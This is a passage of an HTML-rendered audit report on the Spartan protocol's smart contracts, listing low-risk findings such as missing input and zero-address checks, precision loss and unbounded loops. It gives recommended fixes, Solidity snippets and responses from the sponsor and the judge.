confirmed</a>:</strong></p>\n<blockquote>\n<p>Non-critical, but makes sense; will change this 👍</p>\n</blockquote>\n<h2 id=\"l-10-missing-check-for-already-curated-pool-being-re-curated\" style=\"position:relative;\"><a href=\"#l-10-missing-check-for-already-curated-pool-being-re-curated\" aria-label=\"l 10 missing check for already curated pool being re curated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/137\">[L-10] Missing check for already curated pool being re-curated</a></h2>\n<p><code>addCuratedPool()</code> is missing a <code>require(isCuratedPool[_pool] == false)</code> check, similar to the one in <code>removeCuratedPool</code> to ensure that the DAO is not trying to curate an already curated pool which indicates a mismatch of assumption/accounting compared to the contract state.</p>\n<p>Recommend adding <code>require(isCuratedPool[_pool] == false)</code> before setting <code>isCuratedPool[_pool]</code> = true.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/137#issuecomment-886323645\">SamusElderg (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Check needs to be added for this issue</p>\n</blockquote>\n<h2 id=\"l-11-inconsistent-value-of-burnsynth-between-pool-and-synth\" style=\"position:relative;\"><a href=\"#l-11-inconsistent-value-of-burnsynth-between-pool-and-synth\" aria-label=\"l 11 inconsistent value of burnsynth between pool and synth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/70\">[L-11] Inconsistent value of <code>burnSynth</code> between Pool and Synth</a></h2>\n<p>When users try to born synth, the fee and the value of Sparta is calculated at contract <code>Pool</code> while the logic of burning <code>Pool</code>s Lp and Synth is located at <code>Synth</code> contract.</p>\n<p>Users can send synth to the <code>Synth</code> contract directly and trigger <code>burnSynth</code> at the <code>Pool</code> contract. The Pool would not send any token out while the <code>Synth</code> contract would burn the lp and Synth.\nWhile users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.</p>\n<p>Pool’s <code>burnSynth</code> and Synth’s <code>burnSynth</code> are tightly coupled functions. In fact, according to the current logic, <code>Synth:burnSynth</code> should only be triggered from a valid <code>Pool</code> contract.</p>\n<p>IMHO, applying the<code>Money in - Money Out</code> model in the <code>Synth</code> contract does more harm than good to the readability and security of the protocol. Consider to let <code>Pool</code> contract pass the parameters to the <code>Synth</code> contract and add a require check in the <code>Synth</code> contract.</p>\n<p>[L-12] <a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/45\"><code>synthVault.sol</code>: <code>_processWithdraw</code>: Replace <code>synthReward</code> with principle</a></p>\n<h2 id=\"l-13-missing-zero-address-checks-in-constructors-and-setters\" style=\"position:relative;\"><a href=\"#l-13-missing-zero-address-checks-in-constructors-and-setters\" aria-label=\"l 13 missing zero address checks in constructors and setters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/93\">[L-13] Missing zero-address checks in constructors and setters</a></h2>\n<p>Checking addresses against zero-address during initialization or during setting is a security best-practice. However, such checks are missing in address variable initializations/changes in many places. Given that zero-address is used as an indicator for BNB, there is a greater risk of using it accidentally.</p>\n<p>Allowing zero-addresses will lead to contract reverts and force redeployments if there are no setters for such address variables.</p>\n<p>Recommend adding zero-address checks for all initializations/setters of all address state variables.</p>\n<h2 id=\"l-14-mismatch-in-event-definition\" style=\"position:relative;\"><a href=\"#l-14-mismatch-in-event-definition\" aria-label=\"l 14 mismatch in event definition permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/210\">[L-14] Mismatch in event definition</a></h2>\n<p>In synthFactory.sol, there’s an <code>event CreateSynth(address indexed token, address indexed pool)</code>. However the event is emitted with “synth” as second output.</p>\n<p>Recommend thinking about what’s the better variable to be emitted, and correct one of the lines.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/210#issuecomment-886304612\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Code can be a little bit more cleaner</p>\n</blockquote>\n<h2 id=\"l-15-missing-revert-if-denominator--0\" style=\"position:relative;\"><a href=\"#l-15-missing-revert-if-denominator--0\" aria-label=\"l 15 missing revert if denominator  0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/214\">[L-15] Missing revert if denominator = 0</a></h2>\n<p>In <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Synth.sol#L176\">Synth.sol</a>, the function <code>burnSynth()</code> calculates a division between two variables. Since they can be zero, it’s better to have a require with a clear error message when the division is not possible, otherwise an user wouldn’t know why a transaction reverted.</p>\n<p>Recommend adding a <code>require(denom != 0, \"LPDebt = 0\")</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/214#issuecomment-886303220\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>low risk but will help with error identification</p>\n</blockquote>\n<h2 id=\"l-16-missing-input-validation-zapliquidity\" style=\"position:relative;\"><a href=\"#l-16-missing-input-validation-zapliquidity\" aria-label=\"l 16 missing input validation zapliquidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/222\">[L-16] Missing input validation <code>zapLiquidity()</code></a></h2>\n<p><code>zapLiquidity()</code> in <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L59\">Router.sol</a> misses an input validation unitsInput > 0.</p>\n<p>Recommend adding an input validation for <code>unitsInput</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/222#issuecomment-886298131\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>Low risk but valid</p>\n</blockquote>\n<h2 id=\"l-17-loss-of-precision\" style=\"position:relative;\"><a href=\"#l-17-loss-of-precision\" aria-label=\"l 17 loss of precision permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/224\">[L-17] Loss of precision</a></h2>\n<p>In <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L274\">Router.sol</a>, there’s a loss of precision that can be corrected by shifting the operations.</p>\n<p>Consider rewriting L274-275 with <code>uint numerator = (_fees * reserve) / eraLength / maxTrades;</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/224#issuecomment-886296064\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Suggested mitigation is valid</p>\n</blockquote>\n<h2 id=\"l-18-missing-input-validation-in-addliquidityformember\" style=\"position:relative;\"><a href=\"#l-18-missing-input-validation-in-addliquidityformember\" aria-label=\"l 18 missing input validation in addliquidityformember permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/225\">[L-18] Missing input validation in <code>addLiquidityForMember()</code></a></h2>\n<p>In <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L51\">Router.sol</a>, the function <code>addLiquidityForMember()</code> doesn’t check inputBase and <code>inputToken</code>. Since we know they can’t both be zero (it wouldn’t change anything and user pays the gas for nothing).</p>\n<p>Recommend considering adding a require <code>inputBase>0 || inputToken>0</code>.</p>\n<h2 id=\"l-19-daosol-unbounded-iterations-in-claimallformember\" style=\"position:relative;\"><a href=\"#l-19-daosol-unbounded-iterations-in-claimallformember\" aria-label=\"l 19 daosol unbounded iterations in claimallformember permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/37\">[L-19] Dao.sol: Unbounded Iterations in <code>claimAllForMember()</code></a></h2>\n<p>The <code>claimAllForMember()</code> function iterates through the full list of <code>listedAssets</code>. Should <code>listedAssets</code> become too large, as more assets are listed, calling this function will run out of gas and fail.</p>\n<p>A good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAllForMember</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetIndexes</span><span class=\"mtk1\">)  </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> [] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">listedAssets</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">listedBondAssets</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Get array of bond assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assetIndexes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimA</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calcClaimBondedLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">listedAssets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assetIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]]); </span><span class=\"mtk3\">// Check user&#39;s unlocked Bonded LPs for each asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">claimA</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_BONDVAULT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimForMember</span><span class=\"mtk1\">(</span><span class=\"mtk12\">listedAssets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assetIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]], </span><span class=\"mtk12\">member</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Claim LPs if any unlocked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/37#issuecomment-896558338\">SamusElderg (Spartan) confirmed </a>:</strong></p>\n<blockquote>\n<p>Whilst the history array of bondable assets is unlikely to ever exceed maybe 2 - 4 assets; I still like this suggested compromise from a user’s gas-optimization perspective. The UI will always know exactly what assets the user should be able to claim before they press the button to ‘claim all’; so i would like to see us pad this idea out</p>\n</blockquote>\n<h2 id=\"l-20-missing-parameter-validation\" style=\"position:relative;\"><a href=\"#l-20-missing-parameter-validation\" aria-label=\"l 20 missing parameter validation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/147\">[L-20] Missing parameter validation</a></h2>\n<p>Some parameters of functions are not checked for invalid values:</p>\n<ul>\n<li><code>PoolFactory.constructor</code>: Validate <code>_base</code> and <code>_wbnb</code> to be contracts or at least non-zero</li>\n</ul>\n<p>A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.</p>\n<p>Recommend validating the parameters.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/147#issuecomment-894847120\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Keeping this a low risk. Not sure why sponsor disputed.</p>\n</blockquote>\n<h2 id=\"l-21-can-accidentally-lose-tokens-when-removing-liquidity-from-pool-2\" style=\"position:relative;\"><a href=\"#l-21-can-accidentally-lose-tokens-when-removing-liquidity-from-pool-2\" aria-label=\"l 21 can accidentally lose tokens when removing liquidity from pool 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/161\">[L-21] Can accidentally lose tokens when removing liquidity from pool 2</a></h2>\n<p>The <code>Pool.removeLiquiditySingle</code> function redeems liquidity tokens for underlying to the router contract in case of the <code>token</code> being the zero address.\nThis works if the underlying token is actually <code>WBNB</code> but if the pool token is different and the user accidentally inserted <code>0</code> as the <code>token</code> address, it tries to swap a zero-balance WBNB to <code>BASE</code> and the redeemed tokens are stuck.</p>\n<p>If <code>token == 0</code> add a check for <code>pool.token == WBNB</code> such that it is ensured that the pool’s token is actually <code>WBNB</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/161#issuecomment-884637699\">verifyfirst (Spartan) disputed</a>:</strong></p>\n<blockquote>\n<p>In theory this is correct, however, solidity validates function parameters to be legitimate and in this instance, 0 or “0” is not a valid address.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/161#issuecomment-894847911\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’ll keep the issue as it’s technically correct.</p>\n</blockquote>\n<h2 id=\"l-22memberwithdraws-event-not-fired\" style=\"position:relative;\"><a href=\"#l-22memberwithdraws-event-not-fired\" aria-label=\"l 22memberwithdraws event not fired permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/169\">[L-22]<code>MemberWithdraws</code> event not fired</a></h2>\n<p>The <code>MemberWithdraws</code> event of the DAO contract is not used. Unused code can hint at programming or architectural errors. Recommend use it or remove it.</p>\n<h2 id=\"l-23-calcasymmetricvaluetoken-never-used\" style=\"position:relative;\"><a href=\"#l-23-calcasymmetricvaluetoken-never-used\" aria-label=\"l 23 calcasymmetricvaluetoken never used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/170\">[L-23] <code>calcAsymmetricValueToken</code> never used</a></h2>\n<p>The <code>Utils.calcAsymmetricValueToken</code> function is not used. Unused code can hint at programming or architectural errors.</p>\n<p>Recommend using it or removing it.</p>\n<h2 id=\"l-24-membercount-not-accurate\" style=\"position:relative;\"><a href=\"#l-24-membercount-not-accurate\" aria-label=\"l 24 membercount not accurate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/26\">[L-24] <code>memberCount</code> not accurate</a></h2>\n<p>The function <code>depositForMember</code> of BondVault.sol adds user to the array <code>arrayMembers</code>. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array <code>arrayMembers</code>.</p>\n<p>This will mean the <code>memberCount()</code> doesn’t show accurate results. Also <code>allMembers()</code> will contain duplicate members</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"60\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"61\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">depositForMember</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">member</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LPS</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"62\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">mapBondAsset_memberDetails</span><span class=\"mtk1\">[</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">isMember</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">]){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"63\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">mapBondAsset_memberDetails</span><span class=\"mtk1\">[</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">isMember</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Register user as member (scope: user -&gt; asset)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"64\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">arrayMembers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Add user to member array (scope: vault)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"65\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span 